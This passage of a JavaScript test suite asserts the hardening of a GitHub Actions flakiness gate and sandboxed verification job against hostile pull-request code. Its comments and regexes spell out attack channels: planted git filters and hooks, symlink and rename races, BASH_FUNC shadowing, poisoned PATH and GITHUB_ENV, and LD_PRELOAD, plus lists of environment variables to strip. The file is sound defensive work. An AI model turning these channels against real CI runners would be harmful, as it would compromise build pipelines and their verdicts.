      /^\s*timeout -k 10 30 runuser -u node -- env -u GITHUB_OUTPUT -u GITHUB_STATE -u GITHUB_ENV -u GITHUB_PATH -u GITHUB_STEP_SUMMARY \\\n\s*-u GIT_DIR -u GIT_WORK_TREE -u GIT_COMMON_DIR -u GIT_INDEX_FILE -u GIT_OBJECT_DIRECTORY -u GIT_ALTERNATE_OBJECT_DIRECTORIES -u GIT_SHALLOW_FILE -u GIT_EXEC_PATH -u GIT_CONFIG_COUNT -u GIT_CONFIG_PARAMETERS -u GIT_ALLOW_PROTOCOL -u GIT_PROXY_COMMAND -u GIT_SSL_NO_VERIFY -u GIT_SSL_CAINFO -u GIT_ASKPASS -u GIT_SSH -u GIT_SSH_COMMAND \\\n\s*bash -c 'rm -f \.git\/info\/attributes; git config --local --list --name-only 2>\/dev\/null \| grep -o "\^filter\\\.\[\^\.\]\*" \| sort -u \| while IFS= read -r s; do git config --local --remove-section "\$s" 2>\/dev\/null \|\| true; done; git config --local --unset core\.fsmonitor 2>\/dev\/null \|\| true; git config --local --unset core\.hooksPath 2>\/dev\/null \|\| true; git config --local --unset core\.attributesFile 2>\/dev\/null \|\| true' \|\| reset_rc=\$\?$/m;
    assert.match(
      flakeStep.run,
      resetRestoreRe,
      'the tracked-file restore must run as the build user, stripped, bounded, and from the pinned OID',
    );
    assert.match(
      flakeStep.run,
      resetCleanRe,
      'untracked round residue — including nested-.git dirs — must be cleaned without touching gitignored build outputs',
    );
    assert.match(
      flakeStep.run,
      sanitizeRe,
      'the reset must drop .git execution vectors (filters, fsmonitor, hooksPath, attributesFile) BEFORE the restore runs through them',
    );
    assert.match(
      flakeStep.run,
      /^\s*return "\$reset_rc"$/m,
      'reset_round_state must hand its exit code back to the callers — they decide what a failure means',
    );
    assert.match(
      flakeStep.run,
      /^\s*if \[ "\$samples" -eq 0 \]; then\n\s*finish error "workspace reset failed \(exit \$\{reset_rc\}\) — samples would not start from equivalent state"\n\s*fi$/m,
      'a failed reset before ANY sample must fail open to the fixed error verdict — never sample a dirty tree',
    );
    assert.match(
      flakeStep.run,
      /^\s*break 2$/m,
      'a failed reset after samples exist must stop the sampling — collected results are honest and must reach classification',
    );
    assert.match(
      flakeStep.run,
      /^\s*reset_round_state \|\| echo "::warning::post-gate workspace reset failed \(exit \$\?\); continuing with the sampled verdict"$/m,
      'the post-loop cleanup must be best-effort — a fully sampled verdict must never be discarded by a cleanup failure',
    );
    // Kill FIRST (a live daemon can re-dirty the tree after the
    // checkout), with SIGKILL + a bounded wait — one-shot SIGTERM
    // races slow-draining daemons (round 5), the same reasoning as the
    // agent step's guard — and kill AGAIN after the git calls (round
    // 11): they execute PR-planted filters/hooks as node.
    const resetKillFn = flakeStep.run.search(
      /^\s*kill_node_processes\(\) \{$/m,
    );
    const killCallRe = /^\s*kill_node_processes$/gm;
    const firstKillCall = killCallRe.exec(flakeStep.run)?.index ?? -1;
    const secondKillCall = killCallRe.exec(flakeStep.run)?.index ?? -1;
    const sanitizeIdx = flakeStep.run.search(sanitizeRe);
    const resetRestore = flakeStep.run.search(resetRestoreRe);
    const resetClean = flakeStep.run.search(resetCleanRe);
    assert.ok(
      resetKillFn !== -1 && firstKillCall !== -1 && secondKillCall !== -1,
      'the kill must exist as one function, called before AND after the reset git calls',
    );
    // Line-anchored and position-pinned (round 6): the survivor wait
    // must sit inside the kill, not merely exist somewhere.
    const resetWait = flakeStep.run.search(
      /^\s*\[ -n "\$\(ps -o pid=,stat= -u node 2>\/dev\/null \| awk '\$2 !~ \/\^Z\/'\)" \] \|\| break$/m,
    );
    assert.ok(
      resetWait !== -1 && resetKillFn < resetWait,
      'the kill must wait out survivors (zombies disregarded)',
    );
    assert.ok(
      firstKillCall < sanitizeIdx &&
        sanitizeIdx < resetRestore &&
        resetRestore < resetClean &&
        resetClean < secondKillCall,
      'reset order must be: kill, sanitize .git execution vectors, restore from the pinned OID, clean, kill again',
    );
    // And the reset must precede EVERY invocation, not just rounds:
    // lifecycle scripts (npm ci/build, run as node) mutate the tree
    // before the first sample, and a between-rounds reset leaves file i
    // seeing the residue, staged mutations, and HOME state files 1..i-1
    // left THIS round — equivalence is per sample, not per round.
    const resetCall = flakeStep.run.search(/^\s*reset_round_state$/m);
    const loopStart = flakeStep.run.indexOf('while [ "$round" -le "$ROUNDS" ]');
    const invFlush = flakeStep.run.search(/^\s*rm -rf "\$inv_tmp"$/m);
    assert.ok(
      resetCall !== -1 &&
        loopStart !== -1 &&
        invFlush !== -1 &&
        loopStart < resetCall &&
        resetCall < invFlush,
      'the reset must run inside the round loop, before every invocation',
    );
    // Round 11 (R4-1): the restore target must be pinned by OID ONCE,
    // before the loop — a test can `git commit` mid-invocation (an
    // explicit -c identity defeats the fresh-HOME block) and move HEAD;
    // restoring from the moved HEAD would make the committed mutation
    // the pristine baseline. reset --hard also drops files the moved
    // HEAD added, which a pathspec checkout would keep.
    const pinnedOidRe =
      /^\s*PINNED_OID="\$\(timeout -k 30 120 runuser -u node -- env -u GITHUB_OUTPUT -u GITHUB_STATE -u GITHUB_ENV -u GITHUB_PATH -u GITHUB_STEP_SUMMARY \\\n\s*-u GIT_DIR -u GIT_WORK_TREE -u GIT_COMMON_DIR -u GIT_INDEX_FILE -u GIT_OBJECT_DIRECTORY -u GIT_ALTERNATE_OBJECT_DIRECTORIES -u GIT_SHALLOW_FILE -u GIT_EXEC_PATH -u GIT_CONFIG_COUNT -u GIT_CONFIG_PARAMETERS -u GIT_ALLOW_PROTOCOL -u GIT_PROXY_COMMAND -u GIT_SSL_NO_VERIFY -u GIT_SSL_CAINFO -u GIT_ASKPASS -u GIT_SSH -u GIT_SSH_COMMAND \\\n\s*git rev-parse HEAD 2>\/dev\/null\)"$/m;
    const pinnedOid = flakeStep.run.search(pinnedOidRe);
    assert.ok(
      pinnedOid !== -1,
      'the restore target must be pinned by OID before the round loop',
    );
    assert.ok(
      pinnedOid < loopStart,
      'the OID must be pinned before any sample runs',
    );
    assert.match(
      flakeStep.run,
      /^\s*\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\[0-9a-f\]\*\) ;;$/m,
      'the pinned OID must be shape-validated before use',
    );
    assert.match(
      flakeStep.run,
      /^\s*samples=0$/m,
      'the gate must count collected samples — they decide what a later reset failure means',
    );
    // Round 11 (R4-3): one reused output path left the PREVIOUS
    // invocation's bytes behind when a redirect failed to OPEN (bash
    // reports 1 without running the subshell) — every invocation gets
    // a unique path, and a never-created output is infrastructure,
    // never a test outcome.
    const uniqueOut = flakeStep.run.search(
      /^\s*out="\$GATE_DIR\/round-out-\$round-\$i"$/m,
    );
    assert.ok(
      uniqueOut !== -1 && loopStart < uniqueOut,
      'each invocation output must get a unique path — no stale bytes to misread',
    );
    const neverCreated = flakeStep.run.search(
      /^\s*if \[ ! -e "\$out" \]; then$/m,
    );
    const exitClassify = flakeStep.run.search(
      /^\s*elif \[ "\$status" -ge 124 \]; then$/m,
    );
    assert.ok(
      neverCreated !== -1 && exitClassify !== -1 && neverCreated < exitClassify,
      'a never-created output must route to the infra class ahead of the exit-status classifier',
    );
    assert.match(
      flakeStep.run,
      /^\s*rm -f "\$out"$/m,
      'the sample bytes must be reclaimed after classification — ENOSPC is the named hazard of this job',
    );
    // Round 11 (R8-1): rename(2) needs write on the PARENT of the
    // home, which the uid-1000-writable $RUNNER_TEMP top level grants
    // — the 0700 home cannot stop its own entry being swapped after
    // the one-time validation. Every later path-based access
    // re-verifies the identity recorded at validation time.
    assert.match(
      flakeStep.run,
      /^\s*GATE_HOME_ID="\$\(stat -c '%d:%i' "\$GATE_DIR"\)"$/m,
      'the home identity must be recorded at validation time',
    );
    assert.match(
      flakeStep.run,
      /^\s*gate_home_intact\(\) \{$/m,
      'an identity re-check must guard every later path-based access to the home',
    );
    const intactBeforeList = flakeStep.run.search(
      /^\s*gate_home_intact \|\|\n\s*finish error 'the gate working directory changed since validation/m,
    );
    const listRead = flakeStep.run.search(
      /^\s*\{ \[ -f "\$LIST" \] && \[ ! -L "\$LIST" \]; \} \|\|$/m,
    );
    assert.ok(
      intactBeforeList !== -1 && listRead !== -1 && intactBeforeList < listRead,
      'the recorded list must only be read through an intact home',
    );
    // R12-2 entrance 5: `: >` opens with O_TRUNC through any symlink —
    // the truncate must never run ahead of the first identity re-check.
    const truncLog = flakeStep.run.search(/^\s*: > "\$LOG"$/m);
    assert.ok(
      intactBeforeList !== -1 && truncLog !== -1 && intactBeforeList < truncLog,
      'the log truncate must run only through the verified home',
    );
    const intactInLoop = flakeStep.run.search(
      /^\s*if ! gate_home_intact; then\n\s*if \[ "\$samples" -eq 0 \]; then\n\s*finish error 'the gate working directory changed mid-run — refusing to continue'\n\s*fi/m,
    );
    assert.ok(
      intactInLoop !== -1 &&
        loopStart < intactInLoop &&
        intactInLoop < uniqueOut,
      'every invocation output must open through a re-verified home',
    );
    // A swap AFTER samples exist must stop and classify them, not
    // discard them: publishing `error` there would let a PR dodge a
    // computed demotion by renaming the home after its first divergent
    // sample.
    assert.match(
      flakeStep.run,
      /^\s*printf 'gate home changed mid-run: sampling stopped, classifying the collected results\\n' >> "\$DETAIL"\n\s*break 2$/m,
      'a swapped home after samples must keep the collected results',
    );
    assert.match(
      flakeStep.run,
      /^\s*if gate_home_intact; then\n\s*printf '\\nverdict: %s\\nsummary: %s\\n' "\$1" "\$2" >> "\$LOG"$/m,
      'finish must write the verdict to the log only through a home re-verified at call time — a swapped home must not receive the bytes through a planted `log` symlink',
    );
    // Round 11 (R8-35): the gate resolves bare binaries as root; its
    // inherited PATH may be poisoned through the file-command backing
    // files, so pin a root-only-writable one before the first use.
    const gatePathPin = flakeStep.run.search(pathPinRe);
    assert.ok(
      gatePathPin !== -1 && gatePathPin < firstInvocation,
      'the gate must pin a root-only-writable PATH before its first bare-binary resolution',
    );
    assert.equal(
      flakeStep.if,
      "steps.pr.outputs.decision == 'run' && steps.prepare.outputs.verdict == ''",
      'the gate runs exactly when the agent would (after a clean build)',
    );
    // The message above is only true while both conditions stay identical:
    // if the agent's `if:` drifts wider, the agent publishes a verdict on
    // runs the gate never sampled, and the empty FLAKE_VERDICT leaves the
    // headline untouched (the behavioral drive test proves '' can never
    // touch it — the most it can produce is the visible gate-error line).
    assert.equal(
      agentStep.if,
      flakeStep.if,
      'gate and agent must run under identical conditions',
    );
  });

  it('exposes the gate outcome to the publisher and preserves its log', () => {
    assert.equal(
      verifyJob.outputs.flake_verdict,
      '${{ steps.flake.outputs.flake_verdict }}',
    );
    assert.equal(
      verifyJob.outputs.flake_summary,
      '${{ steps.flake.outputs.flake_summary }}',
    );
    assert.equal(
      publishStep.env.FLAKE_VERDICT,
      '${{ needs.verify.outputs.flake_verdict }}',
    );
    assert.equal(
      publishStep.env.FLAKE_SUMMARY,
      '${{ needs.verify.outputs.flake_summary }}',
    );
    // The authoritative log stays root-owned in RUNNER_TEMP and is staged
    // into verify-results by a dedicated always() root step AFTER the agent
    // exits — the last write to that filename. Staging it earlier loses it
    // on an early agent abort, and verify-results is chowned to the build
    // user while PR-controlled agent code runs, so an earlier copy could be
    // rewritten before upload (round-1 review).
    const stageStep = verifyJob.steps.find(
      (s) => s.name === 'Stage flakiness gate log for upload',
    );
    assert.ok(stageStep, 'the staging step must exist');
    assert.equal(
      stageStep.if,
      "always() && steps.pr.outputs.decision == 'run'",
      'staging must survive a failed agent step',
    );
    const agentIdx = verifyJob.steps.indexOf(agentStep);
    const stageIdx = verifyJob.steps.indexOf(stageStep);
    const uploadIdx = verifyJob.steps.findIndex(
      (s) => s.name === 'Upload verify results',
    );
    assert.ok(
      agentIdx < stageIdx && stageIdx < uploadIdx,
      'staging must run after the agent and before the upload',
    );
    // The transport itself (round 6): the chain is only closed if the
    // upload actually ships the staged directory and cannot fail the job
    // out from under the recorded verdict.
    const uploadStep = verifyJob.steps[uploadIdx];
    assert.equal(
      uploadStep.with.path,
      '/flake-gate/upload/',
      'the artifact must ship the REBUILT tree, never the agent-era directory',
    );
    // R12-2 entrance 3: staging's anchoring expires at its exit, and the
    // upload re-resolves the path in a later step — a re-check step must
    // re-validate the entry identity immediately before the enumeration
    // and gate the upload on it.
    const recheckStep = verifyJob.steps.find(
      (s) => s.id === 'flake-upload-check',
    );
    assert.ok(recheckStep, 'the pre-upload re-check step must exist');
    assert.equal(
      recheckStep.if,
      "always() && steps.pr.outputs.decision == 'run'",
      'the re-check must run whenever staging can',
    );
    assert.equal(
      recheckStep['continue-on-error'],
      true,
      'the re-check must not be able to fail the job',
    );
    const recheckIdx = verifyJob.steps.indexOf(recheckStep);
    assert.ok(
      stageIdx < recheckIdx && recheckIdx < uploadIdx,
      'the re-check must sit between staging and the upload',
    );
    assert.equal(
      uploadStep.if,
      "always() && steps.pr.outputs.decision == 'run' && steps.flake-upload-check.outputs.upload_ok == 'true'",
      'the upload must only enumerate a home the re-check step just validated',
    );
    assert.match(
      recheckStep.run,
      /upload_ok=true/,
      'the re-check must publish its decision as a step output',
    );
    assert.match(
      recheckStep.run,
      /\/usr\/bin\/rm -rf -- "\$GATE_DIR"/,
      'a home that fails the re-check must be removed before the upload enumerates the path',
    );
    // R15-1: the re-check has no env -i re-exec — it runs in the
    // inherited job environment. POSIX mode immunizes set/export/exit;
    // every remaining decision must stay a reserved word and every
    // external absolute-pathed, so no shadowable command word stands
    // between a poisoned env and the verdict (a bare cd/[/stat subshell
    // or a bare echo verdict write would re-open exactly that surface).
    assert.match(
      recheckStep.run,
      posixSwitchRe,
      'the re-check must enter POSIX mode so set/export/exit cannot be shadowed by a BASH_FUNC import',
    );
    assert.match(
      recheckStep.run,
      posixKillRe,
      'the posix refusal must end in a slash-pathed kill — exit itself may be the shadowed builtin',
    );
    assert.match(
      recheckStep.run,
      /\/usr\/bin\/printf 'upload_ok=%s\\n' "\$upload_ok" >> "\$GITHUB_OUTPUT"/,
      'the verdict write must be slash-pathed — echo is shadowable by a BASH_FUNC import',
    );
    assert.doesNotMatch(
      recheckStep.run,
      /\(\s*cd /,
      'the re-check must not run a cd-anchored subshell — bare cd/[/stat are shadowable command words',
    );
    assert.match(
      uploadStep.with.name,
      /^verify-results-/,
      'the artifact name must stay in the family the publisher downloads',
    );
    assert.equal(
      uploadStep['continue-on-error'],
      true,
      'a missing/empty results dir must not fail the job and mask the original error',
    );
    // R16-2: the loader channel reaches the final consumer of the defense
    // chain — this uses: step's node process inherits the job env the
    // run: steps blank at their own blocks.
    assert.deepEqual(
      Object.keys(uploadStep.env).sort(),
      ['LD_AUDIT', 'LD_LIBRARY_PATH', 'LD_PRELOAD'],
      'the upload step must blank the LD_* loader channels like its run: siblings',
    );
    // Evidence-copying only, after the verdict outputs are written: a
    // staging failure (ENOSPC, hostile mount) must not flip the job red or
    // the publisher discards the recorded verdict as "infrastructure".
    assert.equal(
      stageStep['continue-on-error'],
      true,
      'staging must not be able to fail the job',
    );
    // The ORDER is the guard (round-4 R2-P1): presence-only pins stayed
    // green with `cp` reordered before the unlinks, reopening the planted
    // FIFO/symlink hazard. Kill racers → drop a planted dir/symlink at the
    // directory level → recreate → unlink the destination entry → copy.
    // Line-anchored (round 5): unanchored substrings are satisfied by
    // comments, and the guard's REACTION (the directory-level rm) must be
    // part of the chain — an inert guard body lets mkdir/cp write through
    // a planted symlink.
    // Round 7 rewrite: the step no longer HARDENS the agent-era tree (its
    // entry lived in the uid-1000-writable $RUNNER_TEMP, so a kill-race
    // survivor could rename the whole hardened tree and replant a symlink
    // farm for upload-artifact to follow). It BUILDS a trusted tree inside
    // the 0700 root-only home instead, copying regular files only.
    const sr = stageStep.run;
    const iPkill = sr.search(/^\s*\/usr\/bin\/pkill -KILL -u node/m);
    // R12-2 entrance 1: one cleanup for both refusals — a detected
    // mid-staging swap must be removed, not merely aborted on.
    const iStagedOk = sr.search(/^\s*staged_ok=''$/m);
    const iWait = sr.search(
      /^\s*\[\[ -n \$\(\/usr\/bin\/ps -o pid=,stat= -u node 2>\/dev\/null \| \/usr\/bin\/awk '\$2 !~ \/\^Z\/'\) \]\] \|\| break$/m,
    );
    // R12-2 entrance 4: the budget loop alone is out-forked by a plant
    // repopulating between sweeps — the kill ends in a liveness check
    // and a fail-closed refusal matching the agent-step guard.
    const iSurvivors = sr.search(
      /^\s*survivors="\$\(\/usr\/bin\/ps -o pid=,stat= -u node 2>\/dev\/null \| \/usr\/bin\/awk '\$2 !~ \/\^Z\/'\)" \|\| true$/m,
    );
    const stageReExec = sr.search(reExecMarkerRe);
    const iHomeCheck = sr.search(
      /^\s*if \[\[ ! -L \$GATE_DIR \]\] && \[\[ -d \$GATE_DIR \]\] && \[\[ -O \$GATE_DIR \]\] &&$/m,
    );
    // The RUN-identity conjunct: ownership/mode/shape all pass on a
    // stale-but-genuine home an earlier run left on the persistent
    // pool; only the marker the record step stamped separates runs.
    const iRunId = sr.search(
      /^\s*\[\[ \$\(cat "\$GATE_DIR\/run-id" 2>\/dev\/null\) == "\$\{GITHUB_RUN_ID:\?\}-\$\{GITHUB_RUN_ATTEMPT:\?\}" \]\]; then$/m,
    );
    // R12-2: the validated ENTRY lives in the uid-1000-writable
    // $RUNNER_TEMP top level, so the rebuild cds into the home once,
    // re-stats the opened directory against the validated identity, and
    // runs every phase from relative paths anchored to that inode.
    const iHomeId = sr.search(
      /^\s*home_id="\$\(stat -c '%d:%i' "\$GATE_DIR" 2>\/dev\/null \|\| true\)"$/m,
    );
    const iHomeCd = sr.search(/^\s*cd "\$GATE_DIR" \|\| exit 1$/m);
    const iHomeIntact = sr.search(
      /^\s*\[ "\$\(stat -c '%d:%i' \. 2>\/dev\/null\)" = "\$home_id" \] \|\| exit 1$/m,
    );
    // R12-2 entrance 2: the outer conjuncts are six separate path
    // resolutions a swap can thread — the attribute half must re-run
    // against the OPENED directory.
    // The guards are explicit `|| exit 1`, not bare statements: the
    // subshell is an `if` condition, where bash suppresses errexit —
    // an unguarded failing check would fall through into the copy
    // phases instead of refusing.
    const iInnerOwner = sr.search(/^\s*\[ -O \. \] \|\| exit 1$/m);
    const iInnerMode = sr.search(
      /^\s*\[ "\$\(stat -c '%a' \. 2>\/dev\/null\)" = '700' \] \|\| exit 1$/m,
    );
    const iInnerRunId = sr.search(
      /^\s*\[ "\$\(cat \.\/run-id 2>\/dev\/null\)" = "\$\{GITHUB_RUN_ID:\?\}-\$\{GITHUB_RUN_ATTEMPT:\?\}" \] \|\| exit 1$/m,
    );
    const iFresh = sr.search(
      /^\s*install -d -m 0700 -o root -g root upload \|\| exit 1$/m,
    );
    const iCopyRegular = sr.search(
      /^\s*timeout -k 10 60 find \. -type f -exec cp -f --no-dereference --parents \{\} "\$UPLOAD_DIR\/" \\;$/m,
    );
    // R12-2: the per-entry find→cp race can still land a symlink or
    // FIFO/socket/device inside the rebuilt tree; the scrub deletes
    // every non-regular arrival inside the root-only home before
    // upload-artifact (which follows links) can ship it.
    const iScrub = sr.search(
      /^\s*find upload \\\( -type l -o -type p -o -type s -o -type b -o -type c \\\) -delete \|\| exit 1$/m,
    );
    const iCopyLog = sr.search(
      /^\s*cp -f --no-dereference log upload\/flake-gate\.log \|\| exit 1$/m,
    );
    const iChown = sr.search(/^\s*chown -R root:root upload \|\| exit 1$/m);
    const iChmod = sr.search(/^\s*chmod -R go-rwx upload \|\| exit 1$/m);
    // R13-21: the always() upload step enumerates the path
    // unconditionally, so a home that failed validation must be removed
    // — a stale tree left in place ships a previous run's evidence
    // under this run's artifact name.
    const iStaleRemoval = sr.search(/^\s*rm -rf -- "\$GATE_DIR"$/m);
    // Round 11 (R8-36): the guard and the cd re-resolve verify-results;
    // a kill-loop survivor owning the uid-1000 parent can swap the
    // entry between the two — the opened directory must still BE the
    // validated one, or the copy is skipped.
    // || true (round 14): a survivor renaming verify-results between
    // the guard and this stat must degrade to a skipped copy, never a
    // set -e abort that discards the authoritative gate-log copy.
    const iVrId = sr.search(
      /^\s*vr_id="\$\(stat -c '%d:%i' "\$RUNNER_TEMP\/verify-results" 2>\/dev\/null \|\| true\)"$/m,
    );
    const iVrIntact = sr.search(
      /^\s*\[ "\$\(stat -c '%d:%i' \. 2>\/dev\/null\)" = "\$vr_id" \] &&$/m,
    );
    // Round 11 (R4-6/R8-7): the pinned log name must be reserved
    // before the conditional copy — a planted file must not survive a
    // missing authoritative log, and a planted directory must not
    // swallow the authoritative file.
    const iReserveName = sr.search(
      /^\s*rm -rf -- upload\/flake-gate\.log \|\| exit 1$/m,
    );
    // The kill must NOT be gated on the log existing: node can unlink the
    // log, and that must not skip the rebuild for the agent's own report.
    assert.ok(
      iPkill < sr.search(/^\s*GATE_DIR=/m),
      'the kill must run before (and independently of) the home lookup',
    );
    assert.doesNotMatch(
      sr,
      /^\s*if \[ -f "\$\{?RUNNER_TEMP:?\??\}?\/flake-gate\.log" \]; then$/m,
      'the rebuild must not be gated on the log file existing',
    );
    // Only regular files cross the boundary, and nothing is resolved:
    // -type f excludes links/FIFOs/sockets/devices at selection time and
    // --no-dereference never opens a target that wins a race after it.
    assert.match(
      sr,
      /-type f -exec cp -f --no-dereference --parents/,
      'only regular files may be copied out of the untrusted tree',
    );
    assert.match(
      sr,
      /\[ -d "\$RUNNER_TEMP\/verify-results" \] && \[ ! -L "\$RUNNER_TEMP\/verify-results" \]/,
      'a symlinked verify-results must not be traversed at all',
    );
    for (const [label, idx] of [
      ['pkill', iPkill],
      ['bounded survivor wait', iWait],
      ['liveness refusal', iSurvivors],
      ['clean re-exec guard', stageReExec],
      ['staging outcome flag', iStagedOk],
      ['root-only home integrity check', iHomeCheck],
      ['run-identity check', iRunId],
      ['home identity pin', iHomeId],
      ['home cd', iHomeCd],
      ['home opened-directory re-check', iHomeIntact],
      ['opened-directory owner re-check', iInnerOwner],
      ['opened-directory mode re-check', iInnerMode],
      ['opened-directory run-identity re-check', iInnerRunId],
      ['fresh 0700 upload dir', iFresh],
      ['verify-results identity pin', iVrId],
      ['opened-directory identity re-check', iVrIntact],
      ['regular-file-only copy', iCopyRegular],
      ['non-regular arrival scrub', iScrub],
      ['log-name reservation', iReserveName],
      ['authoritative log copy', iCopyLog],
      ['root re-own', iChown],
      ['mode revoke', iChmod],
      ['stale-tree removal', iStaleRemoval],
    ]) {
      assert.ok(idx !== -1, `staging must contain the ${label}`);
    }
    assert.ok(
      iPkill < iWait &&
        iWait < iSurvivors &&
        iSurvivors < stageReExec &&
        stageReExec < iStagedOk &&
        iStagedOk < iHomeCheck &&
        iHomeCheck < iRunId &&
        iRunId < iHomeId &&
        iHomeId < iHomeCd &&
        iHomeCd < iHomeIntact &&
        iHomeIntact < iInnerOwner &&
        iInnerOwner < iInnerMode &&
        iInnerMode < iInnerRunId &&
        iInnerRunId < iFresh &&
        iFresh < iVrId &&
        iVrId < iVrIntact &&
        iVrIntact < iCopyRegular &&
        iCopyRegular < iScrub &&
        iScrub < iReserveName &&
        iReserveName < iCopyLog &&
        iCopyLog < iChown &&
        iChown < iChmod &&
        iChmod < iStaleRemoval,
      'staging order must be: kill+wait+liveness, re-exec, home check, run identity, home identity pin, opened-directory attribute re-checks, fresh dir, identity-pinned copy, scrub, reserved log name, authoritative log last, re-own, mode revoke, stale-tree removal',
    );
    assert.match(
      sr,
      pathPinRe,
      'staging must pin a root-only-writable PATH — its inherited one may be poisoned through the file-command backing files',
    );
    // Startup-channel scrub: same one-shot env -i re-exec as the record
    // and gate blocks, positional child marker (env markers forgeable).
    assert.match(
      sr,
      reExecRe,
      'staging must re-exec through env -i with a positional child marker, an absolute-path bash operand, and the parent-snapshotted body',
    );
    assert.doesNotMatch(
      sr,
      pathChildRe,
      'the re-exec child must never re-open the script by path — the second open is the plant window',
    );
    assert.match(
      sr,
      scrubRefusalRe,
      'the staging scrub refusal must be reserved-word shaped — `[` is shadowable by a BASH_FUNC import',
    );
    // R15-1: same discipline as the record step.
    assert.match(
      sr,
      posixSwitchRe,
      'staging must enter POSIX mode so exec/exit cannot be shadowed by a BASH_FUNC import',
    );
    assert.match(
      sr,
      posixKillRe,
      'the posix refusal must end in a slash-pathed kill — exit itself may be the shadowed builtin',
    );
    assert.doesNotMatch(
      sr,
      /_FLAKE_CLEAN_REEXEC/,
      'the re-exec child marker must never be an env entry — env markers are forgeable via the file-command channel',
    );
    assert.doesNotMatch(
      agentStep.run,
      /flake-gate\.log/,
      'the agent step must not stage the log — that is the wrong trust boundary',
    );
    assert.match(
      publishStep.run,
      /^\s*FLAKE_LOG='verify-results\/flake-gate\.log'$/m,
      'the publisher must pin the exact root-level path, never find/sort',
    );
    assert.match(
      publishStep.run,
      /^\s*emit_block 'Flakiness gate log' "\$FLAKE_LOG" 10000$/m,
      'the gate-log cap must leave headroom under GitHub 65,536-char comment limit next to the 45000 report block',
    );
  });

  it('gate authority is one-way: only `flaky` may touch the headline, and only to demote', () => {
    const block = publishStep.run.match(
      /^\s*case "\$\{FLAKE_VERDICT:-\}" in[\s\S]*?^\s*esac$/m,
    );
    assert.ok(
      block,
      'the publisher must map FLAKE_VERDICT through one case block',
    );
    const arms = block[0].split(/;;/);
    for (const arm of arms) {
      const touchesHeadline = /(QUAL|HEADLINE)(_ZH)?=/.test(arm);
      if (!touchesHeadline) continue;
      assert.match(
        arm,
        /^\s*flaky\)/m,
        `only the flaky arm may reassign the headline, found: ${arm.trim().slice(0, 60)}`,
      );
      assert.match(
        arm,
        /QUAL='❌ not passed'/,
        'flaky must demote to not-passed',
      );
      assert.doesNotMatch(
        arm,
        /QUAL='✅/,
        'no gate value may ever set a passing headline',
      );
    }
  });

  it('the flaky demotion also fires when the result artifact is unavailable', () => {
    // FLAKE_VERDICT travels via job outputs, independent of the artifact
    // AND of job completion: cancelled, job-failure, and download-failure
    // branches must each consult it (round 6) — a recorded flaky must
    // never collapse into a neutral ⚠️ notice.
    const branches = [
      [
        'cancelled',
        /if \[ "\$\{VERIFY_RESULT:-\}" = "cancelled" \];[\s\S]*?\n\s*elif /,
      ],
      [
        'job-failure',
        /elif \[ "\$\{VERIFY_RESULT:-\}" != "success" \] \|\| \[ -z "\$\{VERDICT:-\}" \];[\s\S]*?\n\s*elif /,
      ],
      [
        'download-failure',
        /elif \[ "\$\{DOWNLOAD_OUTCOME:-success\}" != "success" \];[\s\S]*?\n\s*elif /,
      ],
    ];
    for (const [label, re] of branches) {
      const branch = publishStep.run.match(re);
      assert.ok(branch, `the ${label} branch must exist`);
      assert.match(
        branch[0],
        /"\$\{FLAKE_VERDICT:-\}" = 'flaky'/,
        `the ${label} branch must consult the gate verdict`,
      );
      assert.match(
        branch[0],
        /^\s*printf '\*\*Sandboxed verification: ❌ not passed — non-deterministic tests \(flakiness gate\)/m,
        `flaky must still demote the ${label} headline`,
      );
    }
    // The branch's only input: DOWNLOAD_OUTCOME must stay wired to the
    // download step's outcome, or the branch is unreachable and the
    // full-report path lies about artifacts that never arrived.
    assert.equal(
      publishStep.env.DOWNLOAD_OUTCOME,
      '${{ steps.download.outcome }}',
      'the download-failure branch input must stay wired',
    );
  });

  it('the gate home sits at the container root, not in the writable RUNNER_TEMP', () => {
    // The whole TOCTOU class (R8-1, R8-36, R12-2 and their re-reports)
    // rests on one property of the PARENT, not the entry: rename(2) and
    // unlink(2) need write permission on the directory holding the entry.
    // $RUNNER_TEMP's top level is uid-1000 writable and the container's
    // node is uid 1000, so a 0700 root home there could always be
    // renamed away wholesale — every added re-validation only narrowed
    // the window. `/` is root:root 755, so entries in it are outside
    // PR-controlled reach with no window to re-check.
    for (const [label, step] of [
      ['record', recordStep],
      ['gate', flakeStep],
      [
        'staging',
        verifyJob.steps.find(
          (x) => x.name === 'Stage flakiness gate log for upload',
        ),
      ],
      [
        'upload re-check',
        verifyJob.steps.find((x) => x.id === 'flake-upload-check'),
      ],
    ]) {
      assert.doesNotMatch(
        step.run,
        /\$\{?RUNNER_TEMP:?\??\}?\/flake-gate/,
        `${label} must not place the gate home under RUNNER_TEMP`,
      );
    }
    assert.match(
      recordStep.run,
      /^\s*GATE_HOME=\/flake-gate$/m,
      'the record step must create the home at the container root',
    );
    for (const [label, step] of [
      ['gate', flakeStep],
      [
        'staging',
        verifyJob.steps.find(
          (x) => x.name === 'Stage flakiness gate log for upload',
        ),
      ],
      [
        'upload re-check',
        verifyJob.steps.find((x) => x.id === 'flake-upload-check'),
      ],
    ]) {
      assert.match(
        step.run,
        /^\s*GATE_DIR=\/flake-gate$/m,
        `${label} must resolve the home to the container-root constant`,
      );
    }
    const uploadStep = verifyJob.steps.find(
      (x) => x.name === 'Upload verify results',
    );
    assert.equal(
      uploadStep.with.path,
      '/flake-gate/upload/',
      'the artifact must ship the tree that lives outside PR-writable space',
    );
    // No env knob: $GITHUB_ENV is uid-1000 writable, so an overridable
    // home would be a PR-reachable channel — and the record step rm -rf's
    // whatever the home names.
    for (const step of verifyJob.steps) {
      assert.doesNotMatch(
        String(step.run ?? ''),
        /FLAKE_GATE_HOME/,
        'the gate home must not be overridable through the environment',
      );
    }
  });

  it('the publisher clears its downloaded results before the download', () => {
    // publish-verify runs on the persistent pool and downloads into a
    // workspace-relative dir the runner never cleans: a previous run's
    // flake-gate.log would otherwise survive and be embedded as this
    // run's evidence, since the publisher treats presence as proof.
    const publishJob = doc.jobs['publish-verify'];
    const clearIdx = publishJob.steps.findIndex(
      (x) => x.name === 'Clear stale downloaded results',
    );
    const downloadIdx = publishJob.steps.findIndex((x) => x.id === 'download');
    assert.ok(clearIdx !== -1, 'the publisher must clear stale results');
    assert.ok(
      downloadIdx !== -1 && clearIdx < downloadIdx,
      'the clear must precede the download',
    );
    assert.match(publishJob.steps[clearIdx].run, /rm -rf verify-results/);
  });

  it('the verify job timeout still covers agent + prepare + gate', () => {
